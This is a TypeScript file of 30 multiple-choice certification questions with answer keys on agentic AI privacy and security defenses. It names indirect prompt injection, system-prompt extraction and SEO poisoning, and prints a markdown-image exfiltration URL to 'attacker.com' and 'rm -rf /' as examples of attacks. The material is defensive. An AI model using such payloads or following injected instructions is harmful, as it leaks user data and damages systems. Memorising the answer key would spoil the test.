import { CertQuestion } from '../types';

export const AGENTIC_AI_PRIVACY_QUESTIONS: CertQuestion[] = [
  {
    "id": "agentic_priv_01",
    "section": "privacy",
    "prompt": "What is an 'Indirect Prompt Injection' attack in autonomous AI agent systems?",
    "options": [
      {
        "id": "a",
        "label": "A hardware glitch in GPU cooling fans."
      },
      {
        "id": "b",
        "label": "When an attacker embeds malicious instructions inside external data (e.g. webpage, email, PDF) fetched by an agent tool, hijacking the agent's execution flow."
      },
      {
        "id": "c",
        "label": "A SQL syntax error in a SELECT statement."
      },
      {
        "id": "d",
        "label": "When a user types a prompt in a foreign language."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_02",
    "section": "privacy",
    "prompt": "How should API credentials and secret keys be managed for agent tools in enterprise production?",
    "options": [
      {
        "id": "a",
        "label": "Injected securely at runtime via environment variables or secret vaults (AWS Secrets Manager/Vault) on the backend server, never exposed in model context."
      },
      {
        "id": "b",
        "label": "Hardcoded directly into agent system prompt text."
      },
      {
        "id": "c",
        "label": "Saved in public GitHub repositories."
      },
      {
        "id": "d",
        "label": "Passed as URL query parameters in frontend web clients."
      }
    ],
    "correctOptionId": "a"
  },
  {
    "id": "agentic_priv_03",
    "section": "privacy",
    "prompt": "What is the principle of 'Least Privilege for Agent Tools'?",
    "options": [
      {
        "id": "a",
        "label": "Giving every agent full unrestricted root admin and database DROP permissions."
      },
      {
        "id": "b",
        "label": "Disabling all security controls to maximize speed."
      },
      {
        "id": "c",
        "label": "Limiting the agent to 1 CPU thread."
      },
      {
        "id": "d",
        "label": "Granting each agent tool only the minimal necessary permissions (e.g. read-only replica access, scoped OAuth scopes) required to perform its specific task."
      }
    ],
    "correctOptionId": "d"
  },
  {
    "id": "agentic_priv_04",
    "section": "privacy",
    "prompt": "How can an agent architecture defend against 'Data Exfiltration via Markdown Images' (ASCII Smuggling)?",
    "options": [
      {
        "id": "a",
        "label": "Disable all text output from the agent."
      },
      {
        "id": "b",
        "label": "Allow all external image rendering without checks."
      },
      {
        "id": "c",
        "label": "Sanitize agent markdown responses to disallow rendering unvetted external image URLs (`![img](https://attacker.com/steal?data=...)`) and enforce strict CSP."
      },
      {
        "id": "d",
        "label": "Convert markdown to plain text only on alternate days."
      }
    ],
    "correctOptionId": "c"
  },
  {
    "id": "agentic_priv_05",
    "section": "privacy",
    "prompt": "Why should code interpreter / Python execution tools for agents be run in hardened, ephemeral sandboxes (e.g. gVisor, microVMs)?",
    "options": [
      {
        "id": "a",
        "label": "To increase server RAM consumption."
      },
      {
        "id": "b",
        "label": "To prevent arbitrary code execution from accessing the host file system, internal metadata endpoints (169.254.169.254), or corporate VPC networks."
      },
      {
        "id": "c",
        "label": "Because Python cannot run on bare metal."
      },
      {
        "id": "d",
        "label": "To make code execute in reverse."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_06",
    "section": "privacy",
    "prompt": "When an agent processes customer emails containing PII (names, SSNs, credit cards), what pre-processing is required?",
    "options": [
      {
        "id": "a",
        "label": "PII masking/redaction using deterministic NER scrubbers (e.g. Microsoft Presidio) before forwarding text to third-party model inference APIs."
      },
      {
        "id": "b",
        "label": "Forwarding unencrypted customer data to public web forums."
      },
      {
        "id": "c",
        "label": "Deleting all vowels from the email."
      },
      {
        "id": "d",
        "label": "Ignoring all data privacy regulations."
      }
    ],
    "correctOptionId": "a"
  },
  {
    "id": "agentic_priv_07",
    "section": "privacy",
    "prompt": "What is 'Dual LLM Pattern / Privileged vs Quarantined LLM' in agent security architecture?",
    "options": [
      {
        "id": "a",
        "label": "Running two identical models on two different monitors."
      },
      {
        "id": "b",
        "label": "A system where one model is paid and one is free."
      },
      {
        "id": "c",
        "label": "Translating queries between English and French."
      },
      {
        "id": "d",
        "label": "A quarantined LLM processes untrusted external data with zero tool access, while a privileged LLM receives sanitized summaries and controls sensitive tools."
      }
    ],
    "correctOptionId": "d"
  },
  {
    "id": "agentic_priv_08",
    "section": "privacy",
    "prompt": "How does 'User Impersonation Prevention' work in multi-tenant agent systems?",
    "options": [
      {
        "id": "a",
        "label": "Allowing users to type any username into the prompt."
      },
      {
        "id": "b",
        "label": "Sharing all user data in a global public cache."
      },
      {
        "id": "c",
        "label": "Binding every tool call to the verified cryptographic JWT user identity from the session context, enforcing tenant-level row filtering on database lookups."
      },
      {
        "id": "d",
        "label": "Disabling user login authentication."
      }
    ],
    "correctOptionId": "c"
  },
  {
    "id": "agentic_priv_09",
    "section": "privacy",
    "prompt": "What is the primary danger of granting an agent an unconstrained `execute_shell_command` tool?",
    "options": [
      {
        "id": "a",
        "label": "It slows down internet connection speeds by 5%."
      },
      {
        "id": "b",
        "label": "Prompt injection could allow an attacker to run `rm -rf /`, install cryptominers, exfiltrate environment variables, or establish reverse SSH shells."
      },
      {
        "id": "c",
        "label": "It changes the desktop wallpaper."
      },
      {
        "id": "d",
        "label": "It causes Python to uninstall itself."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_10",
    "section": "privacy",
    "prompt": "In GDPR and CCPA compliance for agent memory stores, how must 'Right to be Forgotten' requests be fulfilled?",
    "options": [
      {
        "id": "a",
        "label": "Purging all user-specific episodic, semantic, and conversational state records from vector databases and checkpointers upon verified request."
      },
      {
        "id": "b",
        "label": "Deleting the entire application codebase."
      },
      {
        "id": "c",
        "label": "Ignoring the request because vector embeddings are non-reversible."
      },
      {
        "id": "d",
        "label": "Emailing the user's data to marketing partners."
      }
    ],
    "correctOptionId": "a"
  },
  {
    "id": "agentic_priv_11",
    "section": "privacy",
    "prompt": "How does 'Tool Confirmation Hashing' prevent Man-in-the-Middle tampering during human approval workflows?",
    "options": [
      {
        "id": "a",
        "label": "Sending a random 4-digit SMS code."
      },
      {
        "id": "b",
        "label": "Encrypting the server motherboard."
      },
      {
        "id": "c",
        "label": "Changing database table passwords."
      },
      {
        "id": "d",
        "label": "Generating a cryptographic SHA-256 hash of the exact tool arguments shown to the human, verifying the hash before executing the resumed tool action."
      }
    ],
    "correctOptionId": "d"
  },
  {
    "id": "agentic_priv_12",
    "section": "privacy",
    "prompt": "What is 'Prompt Leakage / System Prompt Extraction' in agent security, and how is it mitigated?",
    "options": [
      {
        "id": "a",
        "label": "A memory leak in Python garbage collection."
      },
      {
        "id": "b",
        "label": "When prompt files are deleted from disk."
      },
      {
        "id": "c",
        "label": "Attacker coaxing the agent into revealing proprietary internal instructions; mitigated by separating system instructions, applying output guardrails, and input filtering."
      },
      {
        "id": "d",
        "label": "When prompts take longer than 2 seconds to run."
      }
    ],
    "correctOptionId": "c"
  },
  {
    "id": "agentic_priv_13",
    "section": "privacy",
    "prompt": "When configuring egress network filtering for agent sandboxes, which IP range must be strictly blocked?",
    "options": [
      {
        "id": "a",
        "label": "Public Google DNS servers (`8.8.8.8`)."
      },
      {
        "id": "b",
        "label": "Cloud instance metadata services (`169.254.169.254`) and internal private RFC 1918 subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)."
      },
      {
        "id": "c",
        "label": "All TCP ports higher than 1000."
      },
      {
        "id": "d",
        "label": "Localhost loopback for unauthenticated internal services."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_14",
    "section": "privacy",
    "prompt": "What is 'Output Scrubbing' in secure agent architectures?",
    "options": [
      {
        "id": "a",
        "label": "Scanning intermediate and final agent outputs with regex and DLP rules to block accidental leakage of internal API keys, internal IP addresses, or secrets."
      },
      {
        "id": "b",
        "label": "Cleaning computer monitors with microfiber cloths."
      },
      {
        "id": "c",
        "label": "Deleting output files immediately after creation."
      },
      {
        "id": "d",
        "label": "Formatting text with HTML bold tags."
      }
    ],
    "correctOptionId": "a"
  },
  {
    "id": "agentic_priv_15",
    "section": "privacy",
    "prompt": "Why should production agent workflows use 'Zero Data Retention' (ZDR) enterprise agreements with LLM providers?",
    "options": [
      {
        "id": "a",
        "label": "Deletes all user accounts after 30 days."
      },
      {
        "id": "b",
        "label": "Disables all model memory."
      },
      {
        "id": "c",
        "label": "Guarantees free cloud hosting."
      },
      {
        "id": "d",
        "label": "Ensures that enterprise prompts and customer data are not logged, cached, or used to train public foundation models by the vendor."
      }
    ],
    "correctOptionId": "d"
  },
  {
    "id": "agentic_priv_16",
    "section": "privacy",
    "prompt": "What is 'Autonomous Action Blast Radius Limitation'?",
    "options": [
      {
        "id": "a",
        "label": "Physical fire suppression systems in data centers."
      },
      {
        "id": "b",
        "label": "Restricting agents to run only during daylight hours."
      },
      {
        "id": "c",
        "label": "Imposing strict transactional limits (e.g. max $500 transfer, max 50 emails sent, max 10 records modified) without mandatory multi-factor human re-authorization."
      },
      {
        "id": "d",
        "label": "Limiting server CPU temperatures."
      }
    ],
    "correctOptionId": "c"
  },
  {
    "id": "agentic_priv_17",
    "section": "privacy",
    "prompt": "How does 'Canary Token Trapping' detect unauthorized agent tool exploitation in production?",
    "options": [
      {
        "id": "a",
        "label": "Placing yellow birds in server rooms."
      },
      {
        "id": "b",
        "label": "Injecting unique fake canary database records or secrets into environments; any attempt by an agent to access or leak them immediately triggers a high-severity security alert."
      },
      {
        "id": "c",
        "label": "Testing prompts on test accounts."
      },
      {
        "id": "d",
        "label": "Compressing tokens using gzip."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_18",
    "section": "privacy",
    "prompt": "In SOC2 Type II compliance for agentic systems, what audit log trail must be immutably recorded?",
    "options": [
      {
        "id": "a",
        "label": "Full audit logs containing user ID, timestamp, original prompt hash, tool invocations with sanitized arguments, human approval decisions, and execution status."
      },
      {
        "id": "b",
        "label": "Only the total number of words generated."
      },
      {
        "id": "c",
        "label": "Developer git commit messages only."
      },
      {
        "id": "d",
        "label": "Server fan speed logs."
      }
    ],
    "correctOptionId": "a"
  },
  {
    "id": "agentic_priv_19",
    "section": "privacy",
    "prompt": "What is 'Adversarial Prompt Fuzzing' for agent red-teaming?",
    "options": [
      {
        "id": "a",
        "label": "Adding random spaces between words."
      },
      {
        "id": "b",
        "label": "Testing prompts in alphabetical order."
      },
      {
        "id": "c",
        "label": "Translating code into emojis."
      },
      {
        "id": "d",
        "label": "Automated simulation of thousands of jailbreaks, indirect injection payloads, and boundary-probing attacks to discover tool vulnerabilities before deployment."
      }
    ],
    "correctOptionId": "d"
  },
  {
    "id": "agentic_priv_20",
    "section": "privacy",
    "prompt": "When an agent uses web search tools, how can 'Malicious SEO Poisoning' compromise agent workflows?",
    "options": [
      {
        "id": "a",
        "label": "Search engines delete the agent's web browser."
      },
      {
        "id": "b",
        "label": "The agent's internet connection is throttled."
      },
      {
        "id": "c",
        "label": "Attackers optimize malicious websites with invisible text designed to trigger indirect prompt injections when parsed by an autonomous research agent."
      },
      {
        "id": "d",
        "label": "Search results are converted to black and white."
      }
    ],
    "correctOptionId": "c"
  },
  {
    "id": "agentic_priv_21",
    "section": "privacy",
    "prompt": "How should sensitive database connection strings be passed to agent data connector tools?",
    "options": [
      {
        "id": "a",
        "label": "Injected directly into system prompt text in plaintext."
      },
      {
        "id": "b",
        "label": "Never passed to the agent directly; tools run on secure backend workers where database pools are initialized with IAM credentials."
      },
      {
        "id": "c",
        "label": "Saved in client-side localStorage."
      },
      {
        "id": "d",
        "label": "Shared via public Slack channels."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_22",
    "section": "privacy",
    "prompt": "What is 'Tool Squatting / Namespace Collision' in multi-agent tool registries?",
    "options": [
      {
        "id": "a",
        "label": "When a malicious or unauthorized sub-agent registers a tool with a name identical to a legitimate critical tool, intercepting sensitive parameter payloads."
      },
      {
        "id": "b",
        "label": "When two developers write tools with the same variable names."
      },
      {
        "id": "c",
        "label": "When tools take up too much disk space."
      },
      {
        "id": "d",
        "label": "When a tool name exceeds 10 characters."
      }
    ],
    "correctOptionId": "a"
  },
  {
    "id": "agentic_priv_23",
    "section": "privacy",
    "prompt": "How does 'Content Security Policy (CSP)' protect web applications hosting AI agent chat interfaces?",
    "options": [
      {
        "id": "a",
        "label": "Encrypts HTML documents on disk."
      },
      {
        "id": "b",
        "label": "Disables browser cookies."
      },
      {
        "id": "c",
        "label": "Forces all text to be rendered in Times New Roman."
      },
      {
        "id": "d",
        "label": "Restricts the browser from executing untrusted inline scripts or making unauthorized network requests if an agent outputs compromised HTML/JS."
      }
    ],
    "correctOptionId": "d"
  },
  {
    "id": "agentic_priv_24",
    "section": "privacy",
    "prompt": "What is 'Context Isolation' when an agent orchestrates tasks on behalf of two distinct corporate users?",
    "options": [
      {
        "id": "a",
        "label": "Running the agent on two different laptops."
      },
      {
        "id": "b",
        "label": "Translating User A's data into Spanish."
      },
      {
        "id": "c",
        "label": "Strictly separating memory partitions, thread IDs, and session caches to guarantee that User A's data can never bleed into User B's context window."
      },
      {
        "id": "d",
        "label": "Deleting User A's account when User B logs in."
      }
    ],
    "correctOptionId": "c"
  },
  {
    "id": "agentic_priv_25",
    "section": "privacy",
    "prompt": "Why is 'Strict Parameter Type Coercion' required on all agent tool input arguments?",
    "options": [
      {
        "id": "a",
        "label": "Reduces Python file sizes."
      },
      {
        "id": "b",
        "label": "Prevents type confusion attacks, prototype pollution, and SQL/command injection vulnerabilities caused by malformed LLM outputs."
      },
      {
        "id": "c",
        "label": "Makes tools execute 100x faster."
      },
      {
        "id": "d",
        "label": "Disables all unit testing."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_26",
    "section": "privacy",
    "prompt": "What is 'Time-to-Live (TTL) Eviction' for agent memory and session caches?",
    "options": [
      {
        "id": "a",
        "label": "Automatically expiring and deleting ephemeral session states and cached tool results after a configured inactivity window to minimize exposure surface."
      },
      {
        "id": "b",
        "label": "Shutting down the server after 8 hours of uptime."
      },
      {
        "id": "c",
        "label": "Deleting the database every midnight."
      },
      {
        "id": "d",
        "label": "Limiting users to 5-minute conversations."
      }
    ],
    "correctOptionId": "a"
  },
  {
    "id": "agentic_priv_27",
    "section": "privacy",
    "prompt": "How does 'Rate-Limiting per Agent Sub-Task' protect downstream internal microservices?",
    "options": [
      {
        "id": "a",
        "label": "Slows down internet download speeds."
      },
      {
        "id": "b",
        "label": "Forces agents to wait 1 hour between messages."
      },
      {
        "id": "c",
        "label": "Charges developers a fee per API call."
      },
      {
        "id": "d",
        "label": "Prevents a runaway recursive agent loop from unintentionally launching a Denial-of-Service (DoS) attack against internal corporate APIs."
      }
    ],
    "correctOptionId": "d"
  },
  {
    "id": "agentic_priv_28",
    "section": "privacy",
    "prompt": "In enterprise agent governance, what role does a 'Model Safety Gateway / LLM Proxy' (e.g. LiteLLM, Portkey) serve?",
    "options": [
      {
        "id": "a",
        "label": "Translates Python code to Java."
      },
      {
        "id": "b",
        "label": "Generates frontend user interface designs."
      },
      {
        "id": "c",
        "label": "Centralizes API key management, enforces uniform PII redaction policies, logs audit traces, and controls budget quotas across all organizational agents."
      },
      {
        "id": "d",
        "label": "Deletes old git branches."
      }
    ],
    "correctOptionId": "c"
  },
  {
    "id": "agentic_priv_29",
    "section": "privacy",
    "prompt": "What is 'Jailbreak Resistance via System Prompt Fortification'?",
    "options": [
      {
        "id": "a",
        "label": "Encrypting the system prompt text with AES-256."
      },
      {
        "id": "b",
        "label": "Structuring system prompts with XML delimiter tags, clear role boundaries, and explicit override refusal policies that prioritize foundational safety over user inputs."
      },
      {
        "id": "c",
        "label": "Writing system prompts in Latin."
      },
      {
        "id": "d",
        "label": "Hiding system prompts inside image metadata."
      }
    ],
    "correctOptionId": "b"
  },
  {
    "id": "agentic_priv_30",
    "section": "privacy",
    "prompt": "Why should autonomous financial transaction tools require 'Asymmetric Dual-Sign-Off'?",
    "options": [
      {
        "id": "a",
        "label": "Ensures that high-value disbursements generated by an AI agent require explicit independent approvals from two distinct authorized human reviewers before execution."
      },
      {
        "id": "b",
        "label": "Requires signing paperwork with physical blue ink."
      },
      {
        "id": "c",
        "label": "Forces transactions to be split into two equal halves."
      },
      {
        "id": "d",
        "label": "Prevents the agent from calculating numbers."
      }
    ],
    "correctOptionId": "a"
  }
];
